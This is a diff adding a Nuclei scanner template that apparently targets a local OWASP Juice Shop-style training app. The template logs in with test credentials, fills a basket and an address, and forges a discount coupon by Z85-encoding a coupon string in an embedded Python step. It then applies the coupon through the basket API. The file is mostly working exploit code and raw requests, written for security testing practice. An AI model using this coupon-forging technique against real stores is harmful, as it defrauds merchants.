@@ -1,0 +1,167 @@
+id: forge-coupon
+
+info:
+  name: forge-coupon
+  author: thang
+  severity: medium
+
+flow: |
+  http(1) && http(2) && http(3) && code() && http(4)
+
+requests:
+
+# login to account
+  - raw:
+      - |
+        POST /rest/user/login HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+
+        {"email":"trycyber@gmail.com","password":"trycyber"}
+
+    extractors:
+      - type: regex
+        name: token
+        internal: true
+        group: 1
+        regex:
+          - '"token"\s*:\s*"([^"]+)"'
+
+
+
+# add item to basket
+  - raw:
+      - |
+        POST /api/BasketItems/ HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+        Cookie: language=en; token={{token}}
+        
+        
+        {   
+            "ProductId": "14",
+            "BasketId":"6",
+            "quantity":1
+        }
+    
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+# add address         
+          
+  - raw:
+      - |
+        POST /api/Addresss/ HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+        Cookie: language=en; token={{token}}
+        
+                
+        {       
+            "country":"t",
+            "fullName":"t",
+            "mobileNum":1234567890,
+            "zipCode":"12345678",
+            "streetAddress":"t",
+            "city":"t",
+            "state":"t"
+        }
+
+    matchers:
+      - type: status
+        status:
+          - 201
+          
+  
+# add coupon           
+  - raw:
+      - |
+        PUT /rest/basket/6/coupon/{{code_response}} HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Authorization: Bearer {{token}}
+        Cookie: language=en; token={{token}}       
+                
+        {       
+        }
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+    extractors:
+      - type: regex
+        name: discount
+        internal: true
+        group: 1
+        regex:
+          - '"discount"\s*:\s*"([^"]+)"'
+          
+
+code:
+  - engine: 
+      - python3
+    source: |
+        from datetime import datetime
+        import urllib.parse
+
+        # Z85 encoding table
+        Z85_ALPHABET = b"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
+
+        def encode_z85(data):
+            """
+            Encode binary data into Z85 printable string.
+            Input must be divisible by 4 bytes.
+            """
+            if len(data) % 4 != 0:
+                raise ValueError("Z85 encoding requires input length to be divisible by 4")
+            
+            encoded = bytearray()
+            for i in range(0, len(data), 4):
+                # Convert 4 bytes to a 32-bit big-endian integer
+                chunk = data[i:i+4]
+                value = int.from_bytes(chunk, byteorder='big')
+                
+                # Convert to base85 (5 characters)
+                for _ in range(5):
+                    encoded.append(Z85_ALPHABET[value % 85])
+                    value = value // 85
+            
+            # The encoding process produces characters in reverse order
+            encoded.reverse()
+            return bytes(encoded)
+
+        def pad_to_z85(data):
+            """Pad data with null bytes to make it divisible by 4"""
+            pad_len = (4 - (len(data) % 4)) % 4
+            return data + b'\x00' * pad_len
+
+        def rearrange_z85(encoded_str):
+            """Split the Z85 string in half and swap the two parts"""
+            half = len(encoded_str) // 2
+            return encoded_str[half:] + encoded_str[:half]
+
+        # Example usage
+        if __name__ == "__main__":
+            # Original string
+            text = "APR25-85"
+            padded_data = pad_to_z85(text.encode('utf-8'))
+            encoded = encode_z85(padded_data).decode('utf-8')
+            
+            
+            # Rearranged version (desired format)
+            rearranged = rearrange_z85(encoded)
+            encoded_coupon = urllib.parse.quote(rearranged)
+            print(encoded_coupon)
+# digest: 490a00463044022047a48e3faebfadf2f16a79a5c4ba87331f735115036f3934b4885f0b2d13ad3902203b875c5b26cbcd913e5c9b67db37a3ed7cd4a0781b9ec47b3baa119d787a5913:0dd34f63ed422f65711fe796f66903bf
